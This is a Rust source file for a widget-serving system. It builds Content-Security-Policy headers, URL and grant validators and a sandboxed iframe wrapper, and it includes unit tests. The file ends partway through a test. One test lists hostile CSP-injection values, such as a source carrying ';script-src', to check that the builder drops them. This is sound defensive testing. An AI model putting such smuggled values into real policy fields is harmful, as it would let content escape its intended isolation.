//! Widget serving: CSP builders, the host-authored wrapper document, entry
//! meta injection and the URL segment validators every builder relies on.
//!
//! A sandboxed iframe may still navigate itself, and the host document cannot
//! restrict that without a `frame-src` of its own, which would also block the
//! arbitrary embeds pages legitimately use. The wrapper is served next to the
//! bundle and pins its single child frame to the exact widget document URL,
//! so a widget can never navigate into another policy.
//!
//! Widgets built with any SDK version address `window.parent`, so the wrapper
//! relays flw/1 envelopes verbatim between its parent (the host) and its child
//! (the widget) and nothing else; the host keeps treating the wrapper window as
//! the widget's window. The child frame lives in a closed shadow root, so it is
//! not reachable through `window.frames` from any other widget.
//!
//! Builders accept only values that pass the validators below. Anything else
//! is dropped (CSP sources) or refused (`None`), never spliced into a header.
//!
//! Runtime sources travel statelessly: the grant segment of a web frame or
//! document URL may carry `{token}~{runtime}`, where `runtime` is the
//! base64url canonical JSON of the accepted slots. The token binds its digest
//! and the wrapper pins the exact URL, so a widget cannot swap it.

use base64::Engine as _;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use std::collections::BTreeMap;
use std::fmt;

use crate::widget_policy::{
    CspDirective, MAX_WIDGET_RUNTIME_BYTES, WidgetCsp, WidgetPolicy, is_valid_widget_input_path,
    runtime_slots_canonical_json,
};

/// CSP of every bundle file that is not a widget entry document.
pub const WIDGET_ASSET_CSP: &str = "default-src 'none'; sandbox";

/// Schemes every widget document may load locally held bytes from. They never
/// reach the network and are never part of a [`WidgetPolicy`].
pub const LOCAL_SOURCES: [&str; 2] = ["data:", "blob:"];

/// Upper bound on a web grant token used as a URL path segment.
pub const MAX_WEB_GRANT_TOKEN_LEN: usize = 2048;

/// Grant segment of a frame or document URL that requests the baseline policy.
pub const BASELINE_GRANT_SEGMENT: &str = "0";

/// Separates a grant from its runtime component inside one path segment.
pub const RUNTIME_COMPONENT_SEPARATOR: char = '~';

/// Longest base64url (no padding) encoding of [`MAX_WIDGET_RUNTIME_BYTES`].
pub const MAX_RUNTIME_COMPONENT_LEN: usize = (MAX_WIDGET_RUNTIME_BYTES * 4).div_ceil(3);

/// Package ids: `[A-Za-z0-9._-]`, not empty, `.` or `..`.
pub fn is_valid_package_id(id: &str) -> bool {
    !id.is_empty()
        && id != "."
        && id != ".."
        && id
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// Whole-file sha256 of a widget bundle: 64 lowercase hex characters.
pub fn is_valid_bundle_hash(hash: &str) -> bool {
    is_lower_hex_64(hash)
}

/// Desktop grant id: 64 lowercase hex characters (32 random bytes).
pub fn is_desktop_grant_id(id: &str) -> bool {
    is_lower_hex_64(id)
}

/// Web grant token: a compact JWS (three non-empty base64url parts) of
/// bounded length.
pub fn is_web_grant_token(token: &str) -> bool {
    token.len() <= MAX_WEB_GRANT_TOKEN_LEN
        && token.split('.').count() == 3
        && token.split('.').all(|part| {
            !part.is_empty()
                && part
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
        })
}

/// `0` (baseline), a desktop grant id or a web grant token, without a
/// runtime component (see [`split_grant_segment`]).
pub fn is_grant_segment(segment: &str) -> bool {
    segment == BASELINE_GRANT_SEGMENT || is_desktop_grant_id(segment) || is_web_grant_token(segment)
}

/// Splits a URL grant segment into the grant and its optional runtime
/// component: `{grant}` or `{grant}~{runtime}`. The baseline grant never
/// carries a runtime component.
pub fn split_grant_segment(segment: &str) -> Option<(&str, Option<&str>)> {
    match segment.split_once(RUNTIME_COMPONENT_SEPARATOR) {
        None => is_grant_segment(segment).then_some((segment, None)),
        Some((grant, runtime)) => {
            is_runtime_grant(grant, runtime).then_some((grant, Some(runtime)))
        }
    }
}

fn is_runtime_grant(grant: &str, runtime: &str) -> bool {
    grant != BASELINE_GRANT_SEGMENT && is_grant_segment(grant) && is_runtime_component(runtime)
}

fn grant_segment(grant: &str, runtime: Option<&str>) -> Option<String> {
    match runtime {
        None => is_grant_segment(grant).then(|| grant.to_string()),
        Some(runtime) => is_runtime_grant(grant, runtime)
            .then(|| format!("{grant}{RUNTIME_COMPONENT_SEPARATOR}{runtime}")),
    }
}

/// Shape of a runtime component: non-empty base64url without padding, at most
/// [`MAX_RUNTIME_COMPONENT_LEN`] characters. [`decode_runtime_component`]
/// checks the content.
pub fn is_runtime_component(component: &str) -> bool {
    !component.is_empty()
        && component.len() <= MAX_RUNTIME_COMPONENT_LEN
        && component.len() % 4 != 1
        && component
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
}

/// Why runtime slots cannot be carried in a URL.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuntimeComponentError {
    Empty,
    /// Slots are not valid input paths, a source list is empty or not sorted
    /// ascending without duplicates, or the text is not the canonical encoding.
    NotCanonical,
    TooLarge,
    Malformed,
}

impl RuntimeComponentError {
    pub fn code(self) -> &'static str {
        match self {
            RuntimeComponentError::Empty => "empty",
            RuntimeComponentError::NotCanonical => "not-canonical",
            RuntimeComponentError::TooLarge => "too-large",
            RuntimeComponentError::Malformed => "malformed",
        }
    }
}

impl fmt::Display for RuntimeComponentError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            RuntimeComponentError::Empty => "runtime component carries no slots",
            RuntimeComponentError::NotCanonical => "runtime component is not canonical",
            RuntimeComponentError::TooLarge => "runtime slots exceed 1024 bytes",
            RuntimeComponentError::Malformed => "runtime component is not base64url JSON slots",
        })
    }
}

impl std::error::Error for RuntimeComponentError {}

/// Base64url (no padding) of the canonical JSON of accepted runtime slots.
pub fn encode_runtime_component(
    slots: &BTreeMap<String, Vec<String>>,
) -> Result<String, RuntimeComponentError> {
    if slots.is_empty() {
        return Err(RuntimeComponentError::Empty);
    }
    let canonical = slots.iter().all(|(slot, sources)| {
        is_valid_widget_input_path(slot)
            && !sources.is_empty()
            && sources.windows(2).all(|pair| pair[0] < pair[1])
    });
    if !canonical {
        return Err(RuntimeComponentError::NotCanonical);
    }
    let json = runtime_slots_canonical_json(slots);
    if json.len() > MAX_WIDGET_RUNTIME_BYTES {
        return Err(RuntimeComponentError::TooLarge);
    }
    Ok(URL_SAFE_NO_PAD.encode(json))
}

/// Strict inverse of [`encode_runtime_component`]: re-encoding the decoded
/// slots must reproduce `component` byte for byte.
pub fn decode_runtime_component(
    component: &str,
) -> Result<BTreeMap<String, Vec<String>>, RuntimeComponentError> {
    if component.is_empty() {
        return Err(RuntimeComponentError::Empty);
    }
    if component.len() > MAX_RUNTIME_COMPONENT_LEN {
        return Err(RuntimeComponentError::TooLarge);
    }
    if !is_runtime_component(component) {
        return Err(RuntimeComponentError::Malformed);
    }
    let bytes = URL_SAFE_NO_PAD
        .decode(component)
        .map_err(|_| RuntimeComponentError::Malformed)?;
    let slots: BTreeMap<String, Vec<String>> =
        serde_json::from_slice(&bytes).map_err(|_| RuntimeComponentError::Malformed)?;
    if encode_runtime_component(&slots)? != component {
        return Err(RuntimeComponentError::NotCanonical);
    }
    Ok(slots)
}

/// `frame/{widget_id}/{grant}[~{runtime}]` below a bundle prefix.
pub fn widget_frame_path(widget_id: &str, grant: &str, runtime: Option<&str>) -> Option<String> {
    let segment = grant_segment(grant, runtime)?;
    is_frame_widget_id(widget_id).then(|| format!("frame/{widget_id}/{segment}"))
}

/// `widgets/{widget_id}/index.{grant}[~{runtime}].html` below a bundle prefix.
pub fn widget_document_path(widget_id: &str, grant: &str, runtime: Option<&str>) -> Option<String> {
    let segment = grant_segment(grant, runtime)?;
    is_frame_widget_id(widget_id).then(|| format!("widgets/{widget_id}/index.{segment}.html"))
}

/// Absolute URLs of one widget document under each valid, distinct bundle
/// source: the exact `frame-src` pins of its wrapper.
pub fn widget_child_document_urls(
    bundle_sources: &[String],
    widget_id: &str,
    grant: &str,
    runtime: Option<&str>,
) -> Vec<String> {
    let Some(document) = widget_document_path(widget_id, grant, runtime) else {
        return Vec::new();
    };
    unique_sources(bundle_sources, is_bundle_source)
        .into_iter()
        .map(|source| format!("{source}{document}"))
        .filter(|url| is_child_document_url(url))
        .collect()
}

fn is_lower_hex_64(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// Widget ids that survive as one URL path segment inside wrapper markup.
pub fn is_frame_widget_id(id: &str) -> bool {
    !id.is_empty()
        && id != "."
        && id != ".."
        && id.len() <= 128
        && id
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// A bundle serving prefix usable as a CSP source:
/// `scheme://host[:port]/segment/…/` with at least one path segment and a
/// trailing slash, e.g. `flow-widget://localhost/{pkg}/{hash}/`.
pub fn is_bundle_source(source: &str) -> bool {
    serving_url_path(source).is_some_and(|path| path.len() > 1 && path.ends_with('/'))
}

/// An absolute widget document URL a wrapper may frame: `scheme://host[:port]/…`
/// ending in a file segment, e.g. `…/widgets/{wid}/index.0.html`.
pub fn is_child_document_url(url: &str) -> bool {
    serving_url_path(url).is_some_and(|path| !path.ends_with('/'))
}

fn serving_url_path(url: &str) -> Option<&str> {
    let (scheme, rest) = url.split_once("://")?;
    let (authority, path) = rest.split_at(rest.find('/')?);
    (is_url_scheme(scheme) && is_url_authority(authority) && is_absolute_url_path(path))
        .then_some(path)
}

fn is_url_scheme(scheme: &str) -> bool {
    let mut bytes = scheme.bytes();
    bytes.next().is_some_and(|b| b.is_ascii_lowercase())
        && bytes.all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

fn is_url_authority(authority: &str) -> bool {
    let (host, port) = authority
        .split_once(':')
        .map_or((authority, None), |(host, port)| (host, Some(port)));
    let host_ok = host.len() <= 253
        && host.split('.').all(|label| {
            (1..=63).contains(&label.len())
                && label
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        });
    let port_ok = port.is_none_or(|port| {
        (1..=5).contains(&port.len())
            && port.bytes().all(|b| b.is_ascii_digit())
            && port.parse::<u16>().is_ok_and(|port| port != 0)
    });
    host_ok && port_ok
}

fn is_absolute_url_path(path: &str) -> bool {
    let Some(rest) = path.strip_prefix('/') else {
        return false;
    };
    let segments: Vec<&str> = rest.split('/').collect();
    let Some((last, inner)) = segments.split_last() else {
        return false;
    };
    inner.iter().all(|segment| is_url_path_segment(segment))
        && (last.is_empty() || is_url_path_segment(last))
}

fn is_relative_document_path(path: &str) -> bool {
    let segments: Vec<&str> = path.split('/').collect();
    let parents = segments
        .iter()
        .take_while(|segment| **segment == "..")
        .count();
    let rest = &segments[parents..];
    !rest.is_empty() && rest.iter().all(|segment| is_url_path_segment(segment))
}

fn is_url_path_segment(segment: &str) -> bool {
    let bytes = segment.as_bytes();
    if bytes.is_empty() || is_dot_segment(segment) {
        return false;
    }
    let mut index = 0;
    while index < bytes.len() {
        let byte = bytes[index];
        if byte == b'%' {
            let Some(decoded) = bytes
                .get(index + 1..index + 3)
                .and_then(|hex| std::str::from_utf8(hex).ok())
                .and_then(|hex| u8::from_str_radix(hex, 16).ok())
            else {
                return false;
            };
            if decoded < 0x20 || matches!(decoded, 0x7f | b'/' | b'\\') {
                return false;
            }
            index += 3;
        } else if byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'~' | b'-') {
            index += 1;
        } else {
            return false;
        }
    }
    true
}

fn is_dot_segment(segment: &str) -> bool {
    let lower = segment.to_ascii_lowercase();
    matches!(
        lower.as_str(),
        "." | ".." | "%2e" | ".%2e" | "%2e." | "%2e%2e"
    )
}

fn unique_sources(sources: &[String], valid: fn(&str) -> bool) -> Vec<&str> {
    let mut unique: Vec<&str> = Vec::with_capacity(sources.len());
    for source in sources {
        if valid(source) && !unique.contains(&source.as_str()) {
            unique.push(source);
        }
    }
    unique
}

fn granted_sources(csp: Option<&WidgetCsp>, directive: CspDirective) -> Vec<&str> {
    csp.map(|csp| csp.sources(directive).iter().map(String::as_str).collect())
        .unwrap_or_default()
}

fn join_sources<'a>(parts: &[&[&'a str]]) -> Vec<&'a str> {
    let mut joined: Vec<&str> = Vec::new();
    for source in parts.iter().flat_map(|part| part.iter()) {
        if !joined.contains(source) {
            joined.push(source);
        }
    }
    joined
}

fn directive(name: &str, sources: &[&str]) -> String {
    if sources.is_empty() {
        format!("{name} 'none'")
    } else {
        format!("{name} {}", sources.join(" "))
    }
}

fn sandbox_directive(allow_downloads: bool) -> &'static str {
    if allow_downloads {
        "sandbox allow-scripts allow-downloads"
    } else {
        "sandbox allow-scripts"
    }
}

/// CSP of a widget entry document. `bundle_sources` are the widget's own
/// serving prefixes (see [`is_bundle_source`]); `policy` is the effective
/// policy after consent, preview stripping and engine narrowing. A policy
/// whose `csp` fails effective validation contributes no network sources.
/// `local_media` is `false` only for engines gated off `localMedia`, which
/// lose [`LOCAL_SOURCES`] in `media-src`. `include_sandbox` is `false` only
/// for the injected `<meta>` copy, where `sandbox` has no effect.
pub fn widget_document_csp(
    bundle_sources: &[String],
    policy: &WidgetPolicy,
    local_media: bool,
    include_sandbox: bool,
) -> String {
    let bundle = unique_sources(bundle_sources, is_bundle_source);
    let when = |enabled: bool| -> &[&str] { if enabled { &bundle } else { &[] } };
    let blob_when = |enabled: bool| -> &[&str] { if enabled { &["blob:"] } else { &[] } };
    let media_local: &[&str] = if local_media { &LOCAL_SOURCES } else { &[] };
    let wasm: &[&str] = if policy.wasm {
        &["'wasm-unsafe-eval'"]
    } else {
        &[]
    };
    let valid_csp = policy
        .csp
        .validate_effective()
        .is_ok()
        .then_some(&policy.csp);
    let granted = |directive: CspDirective| granted_sources(valid_csp, directive);

    let mut directives = vec![
        "default-src 'none'".to_string(),
        directive(
            "script-src",
            &join_sources(&[&["'unsafe-inline'"], wasm, &bundle]),
        ),
        directive(
            "style-src",
            &join_sources(&[
                &["'unsafe-inline'"],
                &bundle,
                &granted(CspDirective::StyleSrc),
            ]),
        ),
        directive(
            "img-src",
            &join_sources(&[&LOCAL_SOURCES, &bundle, &granted(CspDirective::ImgSrc)]),
        ),
        directive(
            "font-src",
            &join_sources(&[&["data:"], &bundle, &granted(CspDirective::FontSrc)]),
        ),
        directive(
            "connect-src",
            &join_sources(&[
                &LOCAL_SOURCES,
                when(policy.workers),
                &granted(CspDirective::ConnectSrc),
            ]),
        ),
        directive(
            "worker-src",
            &join_sources(&[blob_when(policy.workers), when(policy.workers)]),
        ),
        directive(
            "media-src",
            &join_sources(&[
                media_local,
                when(policy.media),
                &granted(CspDirective::MediaSrc),
            ]),
        ),
        "frame-src 'none'".to_string(),
        "child-src 'none'".to_string(),
        "object-src 'none'".to_string(),
        "manifest-src 'none'".to_string(),
        "base-uri 'none'".to_string(),
        "form-action 'none'".to_string(),
    ];
    if include_sandbox {
        directives.push(sandbox_directive(policy.downloads).to_string());
    }
    directives.join("; ")
}

fn frame_directives(child_urls: &[String]) -> Vec<String> {
    let children = unique_sources(child_urls, is_child_document_url);
    vec![
        "default-src 'none'".to_string(),
        "script-src 'unsafe-inline'".to_string(),
        "style-src 'unsafe-inline'".to_string(),
        directive("frame-src", &children),
        "base-uri 'none'".to_string(),
        "form-action 'none'".to_string(),
    ]
}

/// CSP of the wrapper document. `child_urls` are the exact absolute widget
/// document URLs it may frame (see [`is_child_document_url`]).
pub fn widget_frame_csp(child_urls: &[String], allow_downloads: bool) -> String {
    let mut directives = frame_directives(child_urls);
    directives.push(sandbox_directive(allow_downloads).to_string());
    directives.join("; ")
}

/// The wrapper policy for its injected `<meta>` copy: the header policy
/// without `sandbox`, which meta policies ignore. It keeps the exact
/// `frame-src` pin in force when an edge rewrites the header.
pub fn widget_frame_meta_csp(child_urls: &[String]) -> String {
    frame_directives(child_urls).join("; ")
}

/// Wrapper markup framing `{child_base}widgets/{widget_id}/index.{grant}[~{runtime}].html`.
/// `child_base` is empty or ends in `/`: a relative prefix such as `../../` or
/// an absolute bundle source, so the child is a relative document path or an
/// absolute URL accepted by [`is_child_document_url`]. Returns `None` for any
/// other combination.
pub fn widget_frame_document(
    child_base: &str,
    widget_id: &str,
    grant: &str,
    runtime: Option<&str>,
    allow_downloads: bool,
) -> Option<String> {
    if !child_base.is_empty() && !child_base.ends_with('/') {
        return None;
    }
    let child_src = format!(
        "{child_base}{}",
        widget_document_path(widget_id, grant, runtime)?
    );
    if !is_relative_document_path(&child_src) && !is_child_document_url(&child_src) {
        return None;
    }
    let sandbox = if allow_downloads {
        "allow-scripts allow-downloads"
    } else {
        "allow-scripts"
    };
    Some(format!(
        "<!doctype html><html><head><meta charset=\"utf-8\">\
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
<style>html,body{{margin:0;height:100%;overflow:hidden;background:transparent}}\
body>div{{display:block;width:100%;height:100%}}</style></head><body><script>\
(()=>{{\
const host=document.body.appendChild(document.createElement('div'));\
const root=host.attachShadow({{mode:'closed'}});\
const style=document.createElement('style');\
style.textContent='iframe{{display:block;border:0;width:100%;height:100%}}';\
const frame=document.createElement('iframe');\
frame.setAttribute('sandbox','{sandbox}');\
frame.setAttribute('referrerpolicy','no-referrer');\
frame.setAttribute('src','{child_src}');\
root.append(style,frame);\
const child=frame.contentWindow;\
addEventListener('message',e=>{{\
const bytes=e.data&&e.data.payload&&e.data.payload.bytes;\
const transfer=bytes instanceof ArrayBuffer?[bytes]:[];\
if(e.source===parent)child.postMessage(e.data,'*',transfer);\
else if(e.source===child)parent.postMessage(e.data,'*',transfer);\
}});\
}})();</script></body></html>"
    ))
}

/// Removes every `<meta http-equiv="content-security-policy">` tag and inserts
/// one carrying `csp` directly after a leading doctype (after an optional
/// UTF-8 BOM and whitespace), otherwise at the start of the document (after a
/// UTF-8 BOM). Matching is byte-level, ASCII case-insensitive and linear in the
/// input; a publisher meta that survives can only restrict its own widget.
pub fn inject_document_csp_meta(html: &[u8], csp: &str) -> Vec<u8> {
    let stripped = strip_csp_meta_tags(html);
    let offset = meta_insertion_offset(&stripped);
    let meta = format!(
        "<meta http-equiv=\"Content-Security-Policy\" content=\"{}\">",
        escape_attribute(csp)
    );
    let mut out = Vec::with_capacity(stripped.len() + meta.len());
    out.extend_from_slice(&stripped[..offset]);
    out.extend_from_slice(meta.as_bytes());
    out.extend_from_slice(&stripped[offset..]);
    out
}

fn escape_attribute(value: &str) -> String {
    let mut escaped = String::with_capacity(value.len());
    for character in value.chars() {
        match character {
            '&' => escaped.push_str("&amp;"),
            '"' => escaped.push_str("&quot;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            other => escaped.push(other),
        }
    }
    escaped
}

fn is_html_whitespace(byte: u8) -> bool {
    matches!(byte, b'\t' | b'\n' | 0x0c | b'\r' | b' ')
}

fn starts_with_ignore_case(haystack: &[u8], prefix: &[u8]) -> bool {
    haystack.len() >= prefix.len() && haystack[..prefix.len()].eq_ignore_ascii_case(prefix)
}

enum MetaTag {
    NotMeta,
    Unterminated,
    Complete { end: usize, is_csp: bool },
}

fn strip_csp_meta_tags(html: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(html.len());
    let mut index = 0;
    while index < html.len() {
        match scan_meta_tag(html, index) {
            MetaTag::NotMeta => {
                out.push(html[index]);
                index += 1;
            }
            MetaTag::Unterminated => {
                out.extend_from_slice(&html[index..]);
                break;
            }
            MetaTag::Complete { end, is_csp } => {
                if !is_csp {
                    out.extend_from_slice(&html[index..end]);
                }
                index = end;
            }
        }
    }
    out
}

/// Tokenizes a `<meta>` start tag beginning at `start` the way an HTML parser
/// reads its attributes.
fn scan_meta_tag(html: &[u8], start: usize) -> MetaTag {
    if !starts_with_ignore_case(&html[start..], b"<meta")
        || !html
            .get(start + 5)
            .is_some_and(|b| is_html_whitespace(*b) || matches!(b, b'/' | b'>'))
    {
        return MetaTag::NotMeta;
    }
    let length = html.len();
    let mut index = start + 5;
    let mut is_csp = false;
    loop {
        while index < length && (is_html_whitespace(html[index]) || html[index] == b'/') {
            index += 1;
        }
        let Some(&byte) = html.get(index) else {
            return MetaTag::Unterminated;
        };
        if byte == b'>' {
            return MetaTag::Complete {
                end: index + 1,
                is_csp,
            };
        }
        let name_start = index;
        index += 1;
        while index < length
            && !is_html_whitespace(html[index])
            && !matches!(html[index], b'/' | b'>' | b'=')
        {
            index += 1;
        }
        let name = &html[name_start..index];
        while index < length && is_html_whitespace(html[index]) {
            index += 1;
        }
        let mut value: &[u8] = &[];
        if html.get(index) == Some(&b'=') {
            index += 1;
            while index < length && is_html_whitespace(html[index]) {
                index += 1;
            }
            let Some(&first) = html.get(index) else {
                return MetaTag::Unterminated;
            };
            match first {
                quote @ (b'"' | b'\'') => {
                    let value_start = index + 1;
                    let Some(close) = html[value_start..].iter().position(|b| *b == quote) else {
                        return MetaTag::Unterminated;
                    };
                    value = &html[value_start..value_start + close];
                    index = value_start + close + 1;
                }
                b'>' => {}
                _ => {
                    let value_start = index;
                    while index < length && !is_html_whitespace(html[index]) && html[index] != b'>'
                    {
                        index += 1;
                    }
                    value = &html[value_start..index];
                }
            }
        }
        if name.eq_ignore_ascii_case(b"http-equiv")
            && value.eq_ignore_ascii_case(b"content-security-policy")
        {
            is_csp = true;
        }
    }
}

/// Only whitespace may precede a doctype the meta follows: the initial
/// insertion mode ignores it, so the meta still becomes a `<head>` child.
/// Anything else, comments included, would need a tokenizer to skip safely.
fn meta_insertion_offset(html: &[u8]) -> usize {
    let start = if html.starts_with(b"\xEF\xBB\xBF") {
        3
    } else {
        0
    };
    let doctype = start
        + html[start..]
            .iter()
            .take_while(|byte| is_html_whitespace(**byte))
            .count();
    if starts_with_ignore_case(&html[doctype..], b"<!doctype")
        && let Some(close) = html[doctype..].iter().position(|b| *b == b'>')
    {
        return doctype + close + 1;
    }
    start
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;
    use std::collections::BTreeSet;

    const HASH: &str = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90";
    const FIXTURE: &str = include_str!("../tests/fixtures/widget_csp.json");

    fn desktop_bundle() -> Vec<String> {
        vec![format!("flow-widget://localhost/com.example.maps/{HASH}/")]
    }

    fn map_policy() -> WidgetPolicy {
        WidgetPolicy {
            workers: true,
            wasm: true,
            media: true,
            downloads: true,
            csp: WidgetCsp {
                connect_src: vec![
                    "https://api.maptiler.com".into(),
                    "wss://live.example.com".into(),
                ],
                img_src: vec!["https://a.tile.openstreetmap.org".into()],
                font_src: vec!["https://fonts.gstatic.com".into()],
                media_src: vec!["https://media.example.org".into()],
                style_src: vec!["https://fonts.googleapis.com".into()],
            },
            ..WidgetPolicy::default()
        }
    }

    fn directives(csp: &str) -> Vec<(String, Vec<String>)> {
        csp.split("; ")
            .map(|directive| {
                let mut tokens = directive.split(' ').map(str::to_string);
                (tokens.next().unwrap(), tokens.collect())
            })
            .collect()
    }

    fn sources_of(csp: &str, name: &str) -> Vec<String> {
        directives(csp)
            .into_iter()
            .find(|(directive, _)| directive == name)
            .map(|(_, sources)| sources)
            .unwrap_or_else(|| panic!("{name} missing in {csp}"))
    }

    /// Token hygiene of any widget CSP. With a document `policy`, `connect-src`
    /// and `media-src` that the policy does not extend must hold local schemes
    /// only, never a `://` token.
    fn assert_well_formed(csp: &str, policy: Option<&WidgetPolicy>) {
        assert!(!csp.contains("'self'"), "'self' in {csp}");
        let mut seen = Vec::new();
        for (name, tokens) in directives(csp) {
            assert!(
                !name.is_empty() && name.bytes().all(|b| b.is_ascii_lowercase() || b == b'-'),
                "directive name {name:?} in {csp}"
            );
            assert!(!seen.contains(&name), "duplicate {name} in {csp}");
            seen.push(name.clone());
            assert!(
                !tokens.is_empty() || name == "sandbox",
                "{name} without sources"
            );
            let unique: BTreeSet<&String> = tokens.iter().collect();
            assert_eq!(
                unique.len(),
                tokens.len(),
                "duplicate token in {name}: {csp}"
            );
            let baseline = policy.is_some_and(|policy| match name.as_str() {
                "connect-src" => !policy.workers && policy.csp.connect_src.is_empty(),
                "media-src" => !policy.media && policy.csp.media_src.is_empty(),
                _ => false,
            });
            for token in &tokens {
                assert!(!token.is_empty(), "empty token in {name}");
                assert!(
                    token
                        .bytes()
                        .all(|b| b.is_ascii_graphic() && !matches!(b, b';' | b',' | b'"')),
                    "unsafe token {token:?} in {name}"
                );
                if token.contains('\'') {
                    assert!(
                        ["'none'", "'unsafe-inline'", "'wasm-unsafe-eval'"]
                            .contains(&token.as_str()),
                        "unexpected keyword {token} in {name}"
                    );
                }
                assert!(
                    !(baseline && token.contains("://")),
                    "network token {token} in baseline {name}: {csp}"
                );
            }
        }
    }

    #[test]
    fn fixture_document_csp_matches_exactly() {
        let fixture: Value = serde_json::from_str(FIXTURE).unwrap();
        let cases = fixture["documentCsp"].as_array().unwrap();
        assert!(cases.len() >= 18);
        for case in cases {
            let name = case["name"].as_str().unwrap();
            let bundle: Vec<String> =
                serde_json::from_value(case["bundleSources"].clone()).unwrap();
            let policy: WidgetPolicy = serde_json::from_value(case["policy"].clone()).unwrap();
            let include_sandbox = case["includeSandbox"].as_bool().unwrap();
            let local_media = case
                .get("localMedia")
                .is_none_or(|value| value.as_bool().unwrap());
            let csp = widget_document_csp(&bundle, &policy, local_media, include_sandbox);
            assert_eq!(csp, case["expected"].as_str().unwrap(), "case {name}");
            assert_well_formed(&csp, Some(&policy));
        }
    }

    #[test]
    fn baseline_document_csp_allows_local_schemes_only_and_sandboxes() {
        let csp = widget_document_csp(&desktop_bundle(), &WidgetPolicy::default(), true, true);
        let bundle = desktop_bundle()[0].clone();
        assert_eq!(
            csp,
            format!(
                "default-src 'none'; script-src 'unsafe-inline' {bundle}; style-src 'unsafe-inline' {bundle}; img-src data: blob: {bundle}; font-src data: {bundle}; connect-src data: blob:; worker-src 'none'; media-src data: blob:; frame-src 'none'; child-src 'none'; object-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none'; sandbox allow-scripts"
            )
        );
        assert_well_formed(&csp, Some(&WidgetPolicy::default()));
        assert_eq!(sources_of(&csp, "connect-src"), LOCAL_SOURCES.to_vec());
        assert_eq!(sources_of(&csp, "media-src"), LOCAL_SOURCES.to_vec());
        assert!(
            !widget_document_csp(&desktop_bundle(), &WidgetPolicy::default(), true, false)
                .contains("sandbox")
        );
    }

    #[test]
    fn local_sources_are_emitted_first_and_once() {
        let policy = map_policy();
        let csp = widget_document_csp(&desktop_bundle(), &policy, true, true);
        assert_well_formed(&csp, Some(&policy));
        let bundle = desktop_bundle()[0].clone();
        assert_eq!(
            sources_of(&csp, "connect-src"),
            vec![
                "data:".to_string(),
                "blob:".into(),
                bundle.clone(),
                "https://api.maptiler.com".into(),
                "wss://live.example.com".into()
            ]
        );
        assert_eq!(
            sources_of(&csp, "media-src"),
            vec![
                "data:".to_string(),
                "blob:".into(),
                bundle.clone(),
                "https://media.example.org".into()
            ]
        );
        assert_eq!(
            sources_of(&csp, "img-src")[..2],
            ["data:".to_string(), "blob:".into()]
        );
        assert_eq!(
            sources_of(&csp, "worker-src"),
            vec!["blob:".to_string(), bundle]
        );
        for directive in [
            "script-src",
            "style-src",
            "frame-src",
            "child-src",
            "object-src",
        ] {
            assert!(
                !sources_of(&csp, directive)
                    .iter()
                    .any(|token| token == "data:" || token == "blob:"),
                "{directive}"
            );
        }

        let mut local = WidgetPolicy::default();
        local.csp.connect_src = vec!["blob:".into(), "data:".into()];
        local.csp.media_src = vec!["data:".into()];
        let csp = widget_document_csp(&desktop_bundle(), &local, true, true);
        assert_eq!(
            csp,
            widget_document_csp(&desktop_bundle(), &WidgetPolicy::default(), true, true)
        );
    }

    #[test]
    fn engines_without_local_media_lose_only_media_local_sources() {
        let policy = map_policy();
        let gated = widget_document_csp(&desktop_bundle(), &policy, false, true);
        let open = widget_document_csp(&desktop_bundle(), &policy, true, true);
        assert_well_formed(&gated, Some(&policy));
        assert_eq!(
            sources_of(&gated, "media-src"),
            vec![
                desktop_bundle()[0].clone(),
                "https://media.example.org".into()
            ]
        );
        for (gated, open) in directives(&gated).into_iter().zip(directives(&open)) {
            if gated.0 != "media-src" {
                assert_eq!(gated, open);
            }
        }
        let baseline =
            widget_document_csp(&desktop_bundle(), &WidgetPolicy::default(), false, false);
        assert_eq!(
            sources_of(&baseline, "media-src"),
            vec!["'none'".to_string()]
        );
        assert_eq!(sources_of(&baseline, "connect-src"), LOCAL_SOURCES.to_vec());
    }

    #[test]
    fn effective_sources_reach_the_header_and_invalid_ones_do_not() {
        let mut policy = WidgetPolicy::default();
        policy.csp.img_src = vec![
            "https://*.s3.eu-central-1.amazonaws.com".into(),
            "https://s3.eu-central-1.amazonaws.com/flow-like-content/apps/app_1/".into(),
        ];
        let csp = widget_document_csp(&desktop_bundle(), &policy, true, true);
        assert_well_formed(&csp, Some(&policy));
        assert!(csp.contains("img-src data: blob: flow-widget://localhost/"));
        assert!(csp.contains(" https://*.s3.eu-central-1.amazonaws.com https://s3.eu-central-1.amazonaws.com/flow-like-content/apps/app_1/;"));

        for hostile in [
            "https://s3.example.com/apps/a b/",
            "https://s3.example.com/apps/;script-src/",
            "https://*.example.com/apps/",
            "https://a.*.example.com",
        ] {
            let mut injected = policy.clone();
            injected.csp.connect_src = vec![hostile.into()];
            let csp = widget_document_csp(&desktop_bundle(), &injected, true, true);
            assert_well_formed(&csp, None);
            assert!(!csp.contains("amazonaws"), "{hostile}");
        }
    }

    #[test]
    fn granted_sources_land_only_in_their_own_directive() {
        let policy = map_policy();
        let csp = widget_document_csp(&desktop_bundle(), &policy, true, true);
        assert_well_formed(&csp, Some(&policy));
        for directive in CspDirective::ALL {
            for source in policy.csp.sources(directive) {
                for (name, tokens) in directives(&csp) {
                    let present = tokens.contains(source);
